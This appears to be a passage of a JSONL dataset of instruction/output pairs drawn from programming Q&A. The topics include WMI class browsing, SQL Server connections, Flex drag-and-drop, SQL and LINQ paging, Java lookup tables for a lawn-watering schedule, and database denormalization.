Assert.IsNotNull(item);\n    }\n}\n\nHope this helps."}
{"instruction": "Hey everyone, \nIs there any known way of listing the WMI classes and their properties available for a particular system? Im interested in a vbscript approach, but please suggest anything really :)\nP.S. Great site.", "output": "I believe this is what you want.\nWMI Code Creator\nA part of this nifty utility allows you to browse namespaces/classes/properties on the local and remote PCs, not to mention generating WMI code in VBScript/C#/VB on the fly.  Very useful.\nAlso, the source code used to create the utility is included in the download, which could provide a reference if you wanted to create your own browser like interface."}
{"instruction": "I want to rename a database, but keep getting the error that 'couldn't get exclusive lock' on the database, which implies there is some connection(s) still active.\nHow can I kill all the connections to the database so that I can rename it?", "output": "I usually run into that error when I am trying to restore a database I usually just go to the top of the tree in Management Studio and right click and restart the database server (because it's on a development machine, this might not be ideal in production).  This is close all database connections."}
{"instruction": "Once I've called DragManager.acceptDrag is there any way to \"unaccept\" the drag? Say that I have a view which can accept drag and drop, but only in certain areas. Once the user drags over one of these areas I call DragManager.acceptDrag(this) (from a DragEvent.DRAG_OVER handler), but if the user then moves out of this area I'd like to change the status of the drag to not accepted and show the DragManager.NONE feedback. However, neither calling DragManager.acceptDrag(null) nor DragManager.showFeedback(DragManager.NONE) seems to have any effect. Once I've accepted the drag an set the feedback type I can't seem to change it.\nJust to make it clear: the areas where the user should be able to drop are not components or even display objects, in fact they are just ranges in the text of a text field (like the selection). Had they been components of their own I could have solved it by making each of them accept drag events individually. I guess I could create proxy components that float over the text to emulate it, but I'd rather not if it isn't necessary.\n\nI've managed to get it working in both AIR and the browser now, but only by putting proxy components on top of the ranges of text where you should be able to drop things. That way I get the right feedback and drops are automatically unaccepted on drag exit.\nThis is the oddest thing about D&D in AIR:\nDragManager.doDrag(initiator, source, event, dragImage, offsetX, offsetY);\n\nIn browser-based Flex, offsetX and offsetY should be negative (so says the documentation, and it works fine). However, when running exactly the same code in AIR you have to make the offsets positive. The same numbers, but positive. That is very, very weird.\n\nI've tested some more and what @maclema works, but not if you run in AIR. It seems like drag and drop in AIR is different. It's really, really weird because not only is the feedback not showing correctly, and it's not possible to unaccept, but the coordinates are also completely off. I just tried my application in a browser instead of AIR and dragging and dropping is completely broken.\nAlso, skipping the dragEnter handler works fine in AIR, but breaks everything when running in a browser.", "output": "ok, I see the problem now. Rather than null, try setting it to the dragInitiator.\nCheck this out.\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<mx:WindowedApplication xmlns:mx=\"http://www.adobe.com/2006/mxml\" layout=\"absolute\">\n    <mx:Script>\n    \t<![CDATA[\n    \t\timport mx.controls.Alert;\n    \t\timport mx.events.DragEvent;\n    \t\timport mx.managers.DragManager;\n    \t\timport mx.core.DragSource;\n\n    \t\tprivate function doStartDrag(e:MouseEvent):void {\n    \t\t\tif ( e.buttonDown && !DragManager.isDragging ) {\n    \t\t\tvar ds:DragSource = new DragSource();\n    \t\t\tds.addData(\"test\", \"test\");\n\n    \t\t\tDragManager.doDrag(btn, ds, e);\n    \t\t\t}\n    \t\t}\n\n    \t\tprivate function handleDragOver(e:DragEvent):void {\n    \t\t\tif ( e.localX < cvs.width/2 ) {\n    \t\t\t\t//since null does nothing, lets just set to accept the drag\n    \t\t\t\t//operation, but accept it to the dragInitiator\n    \t\t\t\tDragManager.acceptDragDrop(e.dragInitiator);\n    \t\t\t}\t\n    \t\t\telse {\n    \t\t\t\t//accept drag\n    \t\t\t\tDragManager.acceptDragDrop(cvs);\n    \t\t\t\tDragManager.showFeedback( DragManager.COPY );\n    \t\t\t}\n    \t\t}\n\n    \t\tprivate function handleDragDrop(e:DragEvent):void {\n    \t\t\tif ( e.dragSource.hasFormat(\"test\") ) {\n    \t\t\t\tAlert.show(\"Got a drag drop!\");\n    \t\t\t}\n    \t\t}\n    \t]]>\n    </mx:Script>\n    <mx:Canvas x=\"265\" y=\"66\" width=\"321\" height=\"245\" backgroundColor=\"#FF0000\" id=\"cvs\" dragOver=\"handleDragOver(event)\" dragDrop=\"handleDragDrop(event)\">\n    </mx:Canvas>\n    <mx:Button id=\"btn\" x=\"82\" y=\"140\" label=\"Drag Me\" mouseDown=\"doStartDrag(event)\"/>\n</mx:WindowedApplication>"}
{"instruction": "Is there available any tool for PHP which can be used to generate code for consuming a web service based on its WSDL? Something comparable to clicking \"Add Web Reference\" in Visual Studio or the Eclipse plugin which does the same thing for Java.", "output": "I've had great success with wsdl2php.  It will automatically create wrapper classes for all objects and methods used in your web service."}
{"instruction": "I have a .NET 2.0 application that has recently had contributions that are Service Pack 1 dependent.  The deployment project has detected .NET 2.0 as a prerequisite, but NOT SP1.  How do I include SP1 as a dependency/prerequisite in my deployment project?", "output": "You'll want to setup launch condition in your deployment project to make sure version 2.0 SP1 is installed. You'll want to set a requirement based off the MsiNetAssemblySupport variable, tied to the version number of .NET 2.0 SP1 (2.0.50727.1433 and above according to this page.)\nBootstrapping the project to actually download the framework if it isn't installed is a different matter, and there are plenty of articles out there on how to do that."}
{"instruction": "Many applications have grids that display data from a database table one page at a time. Many of them also let the user pick the number of records per page, sort by any column, and navigate back and forth through the results.\nWhat's a good algorithm to implement this pattern without bringing the entire table to the client and then filtering the data on the client. How do you bring just the records you want to display to the user?\nDoes LINQ simplify the solution?", "output": "There are a few solutions which I use with MS SQL 2005.\nOne of them is ROWNUMBER(). But, personally, I don't like ROWNUMBER() because it doesn't work for big results (DB which I work on is really big -- over 1TB data running thousands of queries in second -- you know -- big social networking site).\nHere are my favourite solution.\nI will use kind of pseudo code of T-SQL.\nLet's find 2nd page of users sorted by forename, surname, where each page has 10 records.\n@page = 2 -- input parameter\n@size = 10 -- can be optional input parameter\n\nif @page < 1 then begin\n    @page = 1 -- check page number\nend\n@start = (@page-1) * @size + 1 -- @page starts at record no @start\n\n-- find the beginning of page @page\nSELECT TOP (@start)\n    @forename = forename,\n    @surname = surname\n    @id = id\nFROM\n    users\nORDER BY\n    forename,\n    surname,\n    id -- to keep correct order in case of have two John Smith.\n\n-- select @size records starting from @start\nSELECT TOP (@size)\n    id,\n    forename,\n    surname\nFROM\n    users\nWHERE\n    (forename = @forename and surname = @surname and id >= @id) -- the same name and surname, but bigger id\n    OR (forename = @forename and surname > @surname) -- the same name, but bigger surname, id doesn't matter\n    OR (forename > @forename) -- bigger forename, the rest doesn't matter\nORDER BY\n    forename,\n    surname,\n    id"}
{"instruction": "Many applications have grids that display data from a database table one page at a time. Many of them also let the user pick the number of records per page, sort by any column, and navigate back and forth through the results.\nWhat's a good algorithm to implement this pattern without bringing the entire table to the client and then filtering the data on the client. How do you bring just the records you want to display to the user?\nDoes LINQ simplify the solution?", "output": "LINQ combined with lambda expressions and anonymous classes in .Net 3.5 hugely simplifies this sort of thing.\nQuerying the database:\nvar customers = from c in db.customers\n                join p in db.purchases on c.CustomerID equals p.CustomerID\n                where p.purchases > 5\n                select c;\n\nNumber of records per page:\ncustomers = customers.Skip(pageNum * pageSize).Take(pageSize);\n\nSorting by any column:\ncustomers = customers.OrderBy(c => c.LastName);\n\nGetting only selected fields from server:\nvar customers = from c in db.customers\n                join p in db.purchases on c.CustomerID equals p.CustomerID\n                where p.purchases > 5\n                select new\n                {\n                    CustomerID = c.CustomerID,\n                    FirstName = c.FirstName,\n                    LastName = c.LastName\n                };\n\nThis creates a statically-typed anonymous class in which you can access its properties:\nvar firstCustomer = customer.First();\nint id = firstCustomer.CustomerID;\n\nResults from queries are lazy-loaded by default, so you aren't talking to the database until you actually need the data. LINQ in .Net also greatly simplifies updates by keeping a datacontext of any changes you have made, and only updating the fields which you change."}
{"instruction": "This is a nasty one for me...  I'm a PHP guy working in Java on a JSP project.  I know how to do what I'm attempting through too much code and a complete lack of finesse.   I'd prefer to do it RIGHT. :) Here is the situation:\nI'm writing a small display to show customers what days they can water their lawns based on their watering group (ABCDE) and what time of year it is.  Our seasons look like this:\nSummer (5-1 to 8-31) \nSpring  (3-1 to 4-30) \nFall (9-1 to 10-31)\nWinter (11-1 to 2-28) \nAn example might be:\nIf I'm in group A, here would be my allowed times:\nWinter: Mondays only\nSpring: Tues, Thurs, Sat\nSummer: Any Day\nFall: Tues, Thurs, Sat\nIf I was writing this in PHP I would use arrays like this:\n//M=Monday,t=Tuesday,T=Thursday.... etc\n$schedule[\"A\"][\"Winter\"]='M';\n$schedule[\"A\"][\"Spring\"]='tTS';\n$schedule[\"A\"][\"Summer\"]='Any';\n$schedule[\"A\"][\"Fall\"]='tTS';\n$schedule[\"B\"][\"Winter\"]='t';\n\nI COULD make the days arrays (array(\"Tuesday\",\"Thursday\",\"Saturday\")) etc, but it is not necessary for what I'm really trying to accomplish.\nI will also need to setup arrays to determine what season I'm in:\n$seasons[\"Summer\"][\"start\"]=0501;\n$seasons[\"Summer\"][\"end\"]=0801;\n\nCan anyone suggest a really cool way to do this? I will have today's date and the group letter.  I will need to get out of my function a day (M) or a series of days (tTS), (Any).\nThanks, folks!", "output": "You could do essentially the same code with Hashtables (or some other Map):\nHashtable<String, Hashtable<String, String>> schedule\n    = new Hashtable<String, Hashtable<String, String>>();\nschedule.put(\"A\", new Hashtable<String, String>());\nschedule.put(\"B\", new Hashtable<String, String>());\nschedule.put(\"C\", new Hashtable<String, String>());\nschedule.put(\"D\", new Hashtable<String, String>());\nschedule.put(\"E\", new Hashtable<String, String>());\n\nschedule.get(\"A\").put(\"Winter\", \"M\");\nschedule.get(\"A\").put(\"Spring\", \"tTS\");\n// Etc...\n\nNot as elegant, but then again, Java isn't a dynamic language, and it doesn't have hashes on the language level.\nNote: You might be able to do a better solution, this just popped in my head as I read your question."}
{"instruction": "I'm always looking for large data sets to test various types of programs on. Does anyone have any suggestions?", "output": "Check out the netflix contest.  I believe they exposed their database, or a large subset, to facilitate the contest.\nUPDATE: Their faq says they have 100 million entries in the subset you can download."}
{"instruction": "This is a nasty one for me...  I'm a PHP guy working in Java on a JSP project.  I know how to do what I'm attempting through too much code and a complete lack of finesse.   I'd prefer to do it RIGHT. :) Here is the situation:\nI'm writing a small display to show customers what days they can water their lawns based on their watering group (ABCDE) and what time of year it is.  Our seasons look like this:\nSummer (5-1 to 8-31) \nSpring  (3-1 to 4-30) \nFall (9-1 to 10-31)\nWinter (11-1 to 2-28) \nAn example might be:\nIf I'm in group A, here would be my allowed times:\nWinter: Mondays only\nSpring: Tues, Thurs, Sat\nSummer: Any Day\nFall: Tues, Thurs, Sat\nIf I was writing this in PHP I would use arrays like this:\n//M=Monday,t=Tuesday,T=Thursday.... etc\n$schedule[\"A\"][\"Winter\"]='M';\n$schedule[\"A\"][\"Spring\"]='tTS';\n$schedule[\"A\"][\"Summer\"]='Any';\n$schedule[\"A\"][\"Fall\"]='tTS';\n$schedule[\"B\"][\"Winter\"]='t';\n\nI COULD make the days arrays (array(\"Tuesday\",\"Thursday\",\"Saturday\")) etc, but it is not necessary for what I'm really trying to accomplish.\nI will also need to setup arrays to determine what season I'm in:\n$seasons[\"Summer\"][\"start\"]=0501;\n$seasons[\"Summer\"][\"end\"]=0801;\n\nCan anyone suggest a really cool way to do this? I will have today's date and the group letter.  I will need to get out of my function a day (M) or a series of days (tTS), (Any).\nThanks, folks!", "output": "There is no pretty solution.  Java just doesn't do things like this well.  Mike's solution is pretty much the way to do it if you want strings as the indices (keys).  Another option if the hash-of-hashes setup is too ugly is to append the strings together (shamelessly stolen from Mike and modified):\nHashtable<String, String> schedule = new Hashtable<String, String>();\nschedule.put(\"A-Winter\", \"M\");\nschedule.put(\"A-Spring\", \"tTS\");\n\nand then lookup:\nString val = schedule.get(group + \"-\" + season);\n\nIf you're unhappy with the general ugliness (and I don't blame you), put it all behind a method call:\nString whenCanIWater(String group, Date date) { /* ugliness here */ }"}
{"instruction": "This is a nasty one for me...  I'm a PHP guy working in Java on a JSP project.  I know how to do what I'm attempting through too much code and a complete lack of finesse.   I'd prefer to do it RIGHT. :) Here is the situation:\nI'm writing a small display to show customers what days they can water their lawns based on their watering group (ABCDE) and what time of year it is.  Our seasons look like this:\nSummer (5-1 to 8-31) \nSpring  (3-1 to 4-30) \nFall (9-1 to 10-31)\nWinter (11-1 to 2-28) \nAn example might be:\nIf I'm in group A, here would be my allowed times:\nWinter: Mondays only\nSpring: Tues, Thurs, Sat\nSummer: Any Day\nFall: Tues, Thurs, Sat\nIf I was writing this in PHP I would use arrays like this:\n//M=Monday,t=Tuesday,T=Thursday.... etc\n$schedule[\"A\"][\"Winter\"]='M';\n$schedule[\"A\"][\"Spring\"]='tTS';\n$schedule[\"A\"][\"Summer\"]='Any';\n$schedule[\"A\"][\"Fall\"]='tTS';\n$schedule[\"B\"][\"Winter\"]='t';\n\nI COULD make the days arrays (array(\"Tuesday\",\"Thursday\",\"Saturday\")) etc, but it is not necessary for what I'm really trying to accomplish.\nI will also need to setup arrays to determine what season I'm in:\n$seasons[\"Summer\"][\"start\"]=0501;\n$seasons[\"Summer\"][\"end\"]=0801;\n\nCan anyone suggest a really cool way to do this? I will have today's date and the group letter.  I will need to get out of my function a day (M) or a series of days (tTS), (Any).\nThanks, folks!", "output": "@Brian Warshaw\nFYI, with Java 1.5, primitives are now autoboxed to the wrapped version, so you can call it with just the primitive:\nHashtable<String, Integer> hash = new Hashtable<String, Integer>();\nhash.put(\"key\", 15); // Works from Java 1.5 on"}
{"instruction": "We have a remoting singleton server running in a separate windows service (let's call her RemotingService). The clients of the RemotingService are ASP.NET instances (many many).\nCurrently, the clients remoting call RemotingService and blocks while the RemotingService call is serviced. However, the remoting service is getting complicated enough (with more RPC calls and complex algorithms) that the asp.net worker threads are blocked for a significantly long time (4-5 seconds).\nAccording to this msdn article, doing this will not scale well because an asp.net worker thread is blocked for each remoting RPC. It advises switching to async handlers to free up asp.net worker threads.\n\nThe purpose of an asynchronous handler\n  is to free up an ASP.NET thread pool\n  thread to service additional requests\n  while the handler is processing the\n  original request.\n\nThis seems fine, except the remoting call still takes up a thread from the thread pool.\nIs this the same thread pool as the asp.net worker threads? \nHow should I go about turning my remoting singleton server into an async system such that I free up my asp.net worker threads?\nI've probably missed out some important information, please let me know if there is anything else you need to know to answer the question.", "output": "Take a look at Asynchronous Pages in ASP.NET."}
{"instruction": "I'm always looking for large data sets to test various types of programs on. Does anyone have any suggestions?", "output": "You might want to look at generating random data for Fuzz Testing. That would give you a pretty much unlimited amount of test data, and you're more likely to hit edge cases.\nMaybe some more information on what kind of test data you want, what format, and for what types of applications?"}
{"instruction": "This is a nasty one for me...  I'm a PHP guy working in Java on a JSP project.  I know how to do what I'm attempting through too much code and a complete lack of finesse.   I'd prefer to do it RIGHT. :) Here is the situation:\nI'm writing a small display to show customers what days they can water their lawns based on their watering group (ABCDE) and what time of year it is.  Our seasons look like this:\nSummer (5-1 to 8-31) \nSpring  (3-1 to 4-30) \nFall (9-1 to 10-31)\nWinter (11-1 to 2-28) \nAn example might be:\nIf I'm in group A, here would be my allowed times:\nWinter: Mondays only\nSpring: Tues, Thurs, Sat\nSummer: Any Day\nFall: Tues, Thurs, Sat\nIf I was writing this in PHP I would use arrays like this:\n//M=Monday,t=Tuesday,T=Thursday.... etc\n$schedule[\"A\"][\"Winter\"]='M';\n$schedule[\"A\"][\"Spring\"]='tTS';\n$schedule[\"A\"][\"Summer\"]='Any';\n$schedule[\"A\"][\"Fall\"]='tTS';\n$schedule[\"B\"][\"Winter\"]='t';\n\nI COULD make the days arrays (array(\"Tuesday\",\"Thursday\",\"Saturday\")) etc, but it is not necessary for what I'm really trying to accomplish.\nI will also need to setup arrays to determine what season I'm in:\n$seasons[\"Summer\"][\"start\"]=0501;\n$seasons[\"Summer\"][\"end\"]=0801;\n\nCan anyone suggest a really cool way to do this? I will have today's date and the group letter.  I will need to get out of my function a day (M) or a series of days (tTS), (Any).\nThanks, folks!", "output": "I'm not a Java programmer, but getting away from Java and just thinking in terms that are more language agnostic - a cleaner way to do it might be to use either constants or enumerated types.  This should work in any langauge that supports multi-dimensional arrays.\nIf using named constants, where, for example: \nint A = 0;\nint B = 1;\nint C = 2;\nint D = 3;\n\nint Spring = 0; \nint Summer = 1;\nint Winter = 2; \nint Fall = 3;\n...\n\nThen the constants serve as more readable array subscripts:\nschedule[A][Winter]=\"M\";\nschedule[A][Spring]=\"tTS\";\nschedule[A][Summer]=\"Any\";\nschedule[A][Fall]=\"tTS\";\nschedule[B][Winter]=\"t\";\n\nUsing enumerated types:\nenum groups\n{\n  A = 0,\n  B = 1,\n  C = 2,\n  D = 3\n}\n\nenum seasons\n{\n  Spring = 0,\n  Summer = 1,\n  Fall = 2,\n  Winter = 3\n}\n...\nschedule[groups.A][seasons.Winter]=\"M\";\nschedule[groups.A][seasons.Spring]=\"tTS\";\nschedule[groups.A][seasons.Summer]=\"Any\";\nschedule[groups.A][seasons.Fall]=\"tTS\";\nschedule[groups.B][seasons.Winter]=\"t\";"}
{"instruction": "I have a large database of normalized order data that is becoming very slow to query for reporting.  Many of the queries that I use in reports join five or six tables and are having to examine tens or hundreds of thousands of lines.\nThere are lots of queries and most have been optimized as much as possible to reduce server load and increase speed.  I think it's time to start keeping a copy of the data in a denormalized format.\nAny ideas on an approach?  Should I start with a couple of my worst queries and go from there?", "output": "I know this is a bit tangential, but have you tried seeing if there are more indexes you can add?\nI don't have a lot of DB background, but I am working with databases a lot recently, and I've been finding that a lot of the queries can be improved just by adding indexes.\nWe are using DB2, and there is a command called db2expln and db2advis, the first will indicate whether table scans vs index scans are being used, and the second will recommend indexes you can add to improve performance.  I'm sure MySQL has similar tools...\nAnyways, if this is something you haven't considered yet, it has been helping a lot with me... but if you've already gone this route, then I guess it's not what you are looking for.\nAnother possibility is a \"materialized view\" (or as they call it in DB2), which lets you specify a table that is essentially built of parts from multiple tables.  Thus, rather than normalizing the actual columns, you could provide this view to access the data... but I don't know if this has severe performance impacts on inserts/updates/deletes (but if it is \"materialized\", then it should help with selects since the values are physically stored separately)."}
{"instruction": "I have a large database of normalized order data that is becoming very slow to query for reporting.  Many of the queries that I use in reports join five or six tables and are having to examine tens or hundreds of thousands of lines.\nThere are lots of queries and most have been optimized as much as possible to reduce server load and increase speed.  I think it's time to start keeping a copy of the data in a denormalized format.\nAny ideas on an approach?  Should I start with a couple of my worst queries and go from there?", "output": "MySQL 5 does support views, which may be helpful in this scenario.  It sounds like you've already done a lot of optimizing, but if not you can use MySQL's EXPLAIN syntax to see what indexes are actually being used and what is slowing down your queries.\nAs far as going about normalizing data (whether you're using views or just duplicating data in a more efficient manner), I think starting with the slowest queries and working your way through is a good approach to take."}
{"instruction": "I have a large database of normalized order data that is becoming very slow to query for reporting.  Many of the queries that I use in reports join five or six tables and are having to examine tens or hundreds of thousands of lines.\nThere are lots of queries and most have been optimized as much as possible to reduce server load and increase speed.  I think it's time to start keeping a copy of the data in a denormalized format.\nAny ideas on an approach?  Should I start with a couple of my worst queries and go from there?", "output": "You might also want to consider selecting into a temporary table and then performing queries on that temporary table.  This would avoid the need to rejoin your tables for every single query you issue (assuming that you can use the temporary table for numerous queries, of course).  This basically gives you denormalized data, but if you are only doing select calls, there's no concern about data consistency."}
{"instruction": "This is a nasty one for me...  I'm a PHP guy working in Java on a JSP project.  I know how to do what I'm attempting through too much code and a complete lack of finesse.   I'd prefer to do it RIGHT. :) Here is the situation:\nI'm writing a small display to show customers what days they can water their lawns based on their watering group (ABCDE) and what time of year it is.  Our seasons look like this:\nSummer (5-1 to 8-31) \nSpring  (3-1 to 4-30) \nFall (9-1 to 10-31)\nWinter (11-1 to 2-28) \nAn example might be:\nIf I'm in group A, here would be my allowed times:\nWinter: Mondays only\nSpring: Tues, Thurs, Sat\nSummer: Any Day\nFall: Tues, Thurs, Sat\nIf I was writing this in PHP I would use arrays like this:\n//M=Monday,t=Tuesday,T=Thursday.... etc\n$schedule[\"A\"][\"Winter\"]='M';\n$schedule[\"A\"][\"Spring\"]='tTS';\n$schedule[\"A\"][\"Summer\"]='Any';\n$schedule[\"A\"][\"Fall\"]='tTS';\n$schedule[\"B\"][\"Winter\"]='t';\n\nI COULD make the days arrays (array(\"Tuesday\",\"Thursday\",\"Saturday\")) etc, but it is not necessary for what I'm really trying to accomplish.\nI will also need to setup arrays to determine what season I'm in:\n$seasons[\"Summer\"][\"start\"]=0501;\n$seasons[\"Summer\"][\"end\"]=0801;\n\nCan anyone suggest a really cool way to do this? I will have today's date and the group letter.  I will need to get out of my function a day (M) or a series of days (tTS), (Any).\nThanks, folks!", "output": "Don't try to be as dynamic as PHP is. You could try to first define what you need.\ninterface Season\n{\n    public string getDays();\n}\n\ninterface User\n{\n    public Season getWinter();\n    public Season getSpring();\n    public Season getSummer();\n    public Season getFall();\n}\n\ninterface UserMap\n{\n    public User getUser(string name);\n}\n\nAnd please, read the documentation of Hashtable before using it. This class is synchronized which means that each call is protected against multithreading which really slows the access when you don't need the extra protection. Please use any Map implementation instead like HashMap or TreeMap."}
{"instruction": "This is a nasty one for me...  I'm a PHP guy working in Java on a JSP project.  I know how to do what I'm attempting through too much code and a complete lack of finesse.   I'd prefer to do it RIGHT. :) Here is the situation:\nI'm writing a small display to show customers what days they can water their lawns based on their watering group (ABCDE) and what time of year it is.  Our seasons look like this:\nSummer (5-1 to 8-31) \nSpring  (3-1 to 4-30) \nFall (9-1 to 10-31)\nWinter (11-1 to 2-28) \nAn example might be:\nIf I'm in group A, here would be my allowed times:\nWinter: Mondays only\nSpring: Tues, Thurs, Sat\nSummer: Any Day\nFall: Tues, Thurs, Sat\nIf I was writing this in PHP I would use arrays like this:\n//M=Monday,t=Tuesday,T=Thursday.... etc\n$schedule[\"A\"][\"Winter\"]='M';\n$schedule[\"A\"][\"Spring\"]='tTS';\n$schedule[\"A\"][\"Summer\"]='Any';\n$schedule[\"A\"][\"Fall\"]='tTS';\n$schedule[\"B\"][\"Winter\"]='t';\n\nI COULD make the days arrays (array(\"Tuesday\",\"Thursday\",\"Saturday\")) etc, but it is not necessary for what I'm really trying to accomplish.\nI will also need to setup arrays to determine what season I'm in:\n$seasons[\"Summer\"][\"start\"]=0501;\n$seasons[\"Summer\"][\"end\"]=0801;\n\nCan anyone suggest a really cool way to do this? I will have today's date and the group letter.  I will need to get out of my function a day (M) or a series of days (tTS), (Any).\nThanks, folks!", "output": "It seems like everyone is trying to find the Java way to do it like you're doing it in PHP, instead of the way it ought to be done in Java. Just consider each piece of your array an object, or, at the very least, the first level of the array as an object and each sub level as variables inside the object. The build a data structure that you populate with said objects and access the objects through the data structure's given accessors.\nSomething like:\nclass Schedule\n{\n  private String group;\n  private String season;\n  private String rundays;\n  public Schedule() { this.group = null; this.season = null; this.rundays= null; }\n  public void setGroup(String g) { this.group = g; }\n  public String getGroup() { return this.group; }\n  ...\n}\n\npublic ArrayList<Schedule> schedules = new ArrayList<Schedule>();\nSchedule s = new Schedule();\ns.setGroup(...);\n...\nschedules.add(s);\n...\n\nOf course that probably isn't right either. I'd make each season an object, and maybe each weekday list as an object too. Anyway, its more easily reused, understood, and extensible than a hobbled-together Hashtable that tries to imitate your PHP code. Of course, PHP has objects too, and you should use them in a similar fashion instead of your uber-arrays, wherever possible. I do understand the temptation to cheat, though. PHP makes it so easy, and so fun!"}
{"instruction": "This is a nasty one for me...  I'm a PHP guy working in Java on a JSP project.  I know how to do what I'm attempting through too much code and a complete lack of finesse.   I'd prefer to do it RIGHT. :) Here is the situation:\nI'm writing a small display to show customers what days they can water their lawns based on their watering group (ABCDE) and what time of year it is.  Our seasons look like this:\nSummer (5-1 to 8-31) \nSpring  (3-1 to 4-30) \nFall (9-1 to 10-31)\nWinter (11-1 to 2-28) \nAn example might be:\nIf I'm in group A, here would be my allowed times:\nWinter: Mondays only\nSpring: Tues, Thurs, Sat\nSummer: Any Day\nFall: Tues, Thurs, Sat\nIf I was writing this in PHP I would use arrays like this:\n//M=Monday,t=Tuesday,T=Thursday.... etc\n$schedule[\"A\"][\"Winter\"]='M';\n$schedule[\"A\"][\"Spring\"]='tTS';\n$schedule[\"A\"][\"Summer\"]='Any';\n$schedule[\"A\"][\"Fall\"]='tTS';\n$schedule[\"B\"][\"Winter\"]='t';\n\nI COULD make the days arrays (array(\"Tuesday\",\"Thursday\",\"Saturday\")) etc, but it is not necessary for what I'm really trying to accomplish.\nI will also need to setup arrays to determine what season I'm in:\n$seasons[\"Summer\"][\"start\"]=0501;\n$seasons[\"Summer\"][\"end\"]=0801;\n\nCan anyone suggest a really cool way to do this? I will have today's date and the group letter.  I will need to get out of my function a day (M) or a series of days (tTS), (Any).\nThanks, folks!", "output": "I agree that you should definitely put this logic behind the clean interface of:\npublic String lookupDays(String group, String date);\n\nbut maybe you should stick the data in a properties file.  I'm not against hardcoding this data in your source files but, as you noticed, Java can be pretty wordy when it comes to nested Collections.  Your file might looks like:\n\nA.Summer=M\n  A.Spring=tTS\n  B.Summer=T\n\nUsually I don't like to move static data like this to an external file because it increases the \"distance\" between the data and the code that uses it.  However, whenever you're dealing with nested Collections, especially maps, things can get real ugly, real fast.\nIf you don't like this idea, maybe you can do something like this:\npublic class WaterScheduler\n{\n  private static final Map<String, String> GROUP2SEASON = new HashMap<String, String>();\n  static\n  {\n    addEntry(\"A\", \"Summer\", \"M\");\n    addEntry(\"A\", \"Spring\", \"tTS\");\n    addEntry(\"B\", \"Summer\", \"T\");\n  }\n\n  private static void addEntry(String group, String season, String value)\n  {\n    GROUP2SEASON.put(group + \".\" + season, value);\n  }\n\n}\n\nYou lose some readability but at least the data is closer to where it's going to be used."}
{"instruction": "This is a nasty one for me...  I'm a PHP guy working in Java on a JSP project.  I know how to do what I'm attempting through too much code and a complete lack of finesse.   I'd prefer to do it RIGHT. :) Here is the situation:\nI'm writing a small display to show customers what days they can water their lawns based on their watering group (ABCDE) and what time of year it is.  Our seasons look like this:\nSummer (5-1 to 8-31) \nSpring  (3-1 to 4-30) \nFall (9-1 to 10-31)\nWinter (11-1 to 2-28) \nAn example might be:\nIf I'm in group A, here would be my allowed times:\nWinter: Mondays only\nSpring: Tues, Thurs, Sat\nSummer: Any Day\nFall: Tues, Thurs, Sat\nIf I was writing this in PHP I would use arrays like this:\n//M=Monday,t=Tuesday,T=Thursday.... etc\n$schedule[\"A\"][\"Winter\"]='M';\n$schedule[\"A\"][\"Spring\"]='tTS';\n$schedule[\"A\"][\"Summer\"]='Any';\n$schedule[\"A\"][\"Fall\"]='tTS';\n$schedule[\"B\"][\"Winter\"]='t';\n\nI COULD make the days arrays (array(\"Tuesday\",\"Thursday\",\"Saturday\")) etc, but it is not necessary for what I'm really trying to accomplish.\nI will also need to setup arrays to determine what season I'm in:\n$seasons[\"Summer\"][\"start\"]=0501;\n$seasons[\"Summer\"][\"end\"]=0801;\n\nCan anyone suggest a really cool way to do this? I will have today's date and the group letter.  I will need to get out of my function a day (M) or a series of days (tTS), (Any).\nThanks, folks!", "output": "I'm totally at a loss as to why some of you seem to think that throwing gobs of objects at the code is the way to go.  For example, there are exactly four seasons, and they don't do or store anything.  How does it simplify anything to make them objects?  Wing is quite right that these should probably be constants (or maybe enums).\nWhat Bruce needs, at it's heart, is simply a lookup table.  He doesn't need a hierarchy of objects and interfaces; he needs a way to look up a schedule based on a season and a group identifier.  Turning things into objects only makes sense if they have responsibilities or state.  If they have neither, then they are simply identifiers, and building special objects for them just makes the codebase larger.\nYou could build, e.g., Group objects that each contain a set of schedule strings (one for each season), but if all the Group object does is provide lookup functionality, then you've reinvented the lookup table in a much less intuitive fashion.  If he has to look up the group, and then lookup the schedule, all he has is a two-step lookup table that took longer to code, is more likely to be buggy, and will be harder to maintain."}
{"instruction": "I'm always looking for large data sets to test various types of programs on. Does anyone have any suggestions?", "output": "I don't know what your target platform is, but if you're developing against a MSSQL database check out Visual Studio for Database Professionals. It has a very cool feature where it can generate data for your schema using a data plan that you can define. \nRedgate also has a datageneration tool, but I haven't used it.\nThe advantage is that you can create a data generation plan and use it to populate your database with consistent, large amounts of data which can be tuned to test specific areas of your schema."}
{"instruction": "I have a large database of normalized order data that is becoming very slow to query for reporting.  Many of the queries that I use in reports join five or six tables and are having to examine tens or hundreds of thousands of lines.\nThere are lots of queries and most have been optimized as much as possible to reduce server load and increase speed.  I think it's time to start keeping a copy of the data in a denormalized format.\nAny ideas on an approach?  Should I start with a couple of my worst queries and go from there?", "output": "I know more about mssql that mysql, but I don't think the number of joins or number of rows you are talking about should cause you too many problems with the correct indexes in place.  Have you analyzed the query plan to see if you are missing any?\nhttp://dev.mysql.com/doc/refman/5.0/en/explain.html\nThat being said, once you are satisifed with your indexes and have exhausted all other avenues, de-normalization might be the right answer.  If you just have one or two queries that are problems, a manual approach is probably appropriate, whereas some sort of data warehousing tool might be better for creating a platform to develop data cubes.\nHere's a site I found that touches on the subject:\nhttp://www.meansandends.com/mysql-data-warehouse/?link_body%2Fbody=%7Bincl%3AAggregation%7D\nHere's a simple technique that you can use to keep denormalizing queries simple, if you're just doing a few at a time (and I'm not replacing your OLTP tables, just creating a new one for reporting purposes).  Let's say you have this query in your application:\nselect a.name, b.address from tbla a \njoin tblb b on b.fk_a_id = a.id where a.id=1\n\nYou could create a denormalized table and populate with almost the same query:\ncreate table tbl_ab (a_id, a_name, b_address); \n-- (types elided)\n\nNotice the underscores match the table aliases you use\ninsert tbl_ab select a.id, a.name, b.address from tbla a\njoin tblb b on b.fk_a_id = a.id \n-- no where clause because you want everything\n\nThen to fix your app to use the new denormalized table, switch the dots for underscores.  \nselect a_name as name, b_address as address \nfrom tbl_ab where a_id = 1;\n\nFor huge queries this can save a lot of time and makes it clear where the data came from, and you can re-use the queries you already have.\nRemember, I'm only advocating this as the last resort.  I bet there's a few indexes that would help you.  And when you de-normalize, don't forget to account for the extra space on your disks, and figure out when you will run the query to populate the new tables.  This should probably be at night, or whenever activity is low.  And the data in that table, of course, will never exactly be up to date.\n[Yet another edit]  Don't forget that the new tables you create need to be indexed too!  The good part is that you can 